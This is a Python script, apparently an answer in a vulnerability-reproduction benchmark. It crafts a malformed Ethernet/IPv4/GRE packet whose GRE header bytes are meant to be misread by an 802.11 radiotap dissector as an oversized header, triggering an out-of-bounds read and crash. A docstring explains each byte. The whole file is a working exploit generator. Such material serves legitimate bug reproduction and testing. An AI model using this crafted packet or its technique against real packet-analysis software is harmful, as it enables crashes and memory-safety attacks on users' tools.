import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability exists because the 802.11 dissector, when invoked
        as a subdissector for GRE, misinterprets the data provided by the GRE
        dissector. It expects a radio information pseudoheader (like radiotap),
        but instead receives GRE-specific data.

        We can exploit this by crafting a GRE packet where the header fields
        are interpreted as a malicious radiotap header.
        - The GRE 'Flags' and 'Version' fields (2 bytes) are misinterpreted as
          the radiotap 'it_version' and 'it_pad' fields. We set them to zero.
        - The GRE 'Protocol Type' field (2 bytes) is misinterpreted as the
          radiotap 'it_len' field. This field is little-endian. By setting
          the GRE Protocol Type to 0x7FFF (big-endian on the wire as b'\x7f\xff'),
          it's read as 0xFF7F (65407), a very large length.
        - The payload following the GRE header is then interpreted as the
          radiotap body. We provide an 'it_present' bitmask (4 bytes) with all
          bits set, indicating that all possible radio information fields are present.
        - We then provide only 3 bytes of data. The radiotap parser, expecting
          many fields (the first of which is 8 bytes long), will read past the
          end of the packet buffer, causing a crash.

        The final packet structure is Ethernet -> IP -> GRE -> Malicious Payload.
        The total length is 14 (Eth) + 20 (IP) + 4 (GRE) + 7 (Payload) = 45 bytes.
        """

        # Ethernet Header (14 bytes)
        eth_header = (
            b'\xff\xff\xff\xff\xff\xff'  # Dst MAC (Broadcast)
            b'\x00\x00\x00\x00\x00\x00'  # Src MAC
            b'\x08\x00'                 # EtherType: IPv4
        )

        # GRE Header (4 bytes) + Payload (7 bytes)
        gre_and_payload = (
            b'\x00\x00'                 # GRE Flags/Version -> radiotap version/pad
            b'\x7f\xff'                 # GRE Protocol Type -> radiotap it_len (0xff7f LE)
            b'\xff\xff\xff\xff'         # radiotap it_present (all fields present)
            b'AAA'                      # Insufficient data for fields, causing OOB read
        )

        # IP Header (20 bytes)
        ip_total_len = 20 + len(gre_and_payload)
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45,                       # Version (4) | IHL (5)
            0,                          # DSCP/ECN
            ip_total_len,               # Total Length
            0xdead,                     # Identification
            0,                          # Flags/Fragment Offset
            64,                         # TTL
            47,                         # Protocol: GRE
            0,                          # Header Checksum (zeroed)
            b'\x7f\x00\x00\x01',        # Src IP (localhost)
            b'\x7f\x00\x00\x01'         # Dst IP (localhost)
        )

        poc = eth_header + ip_header + gre_and_payload
        return poc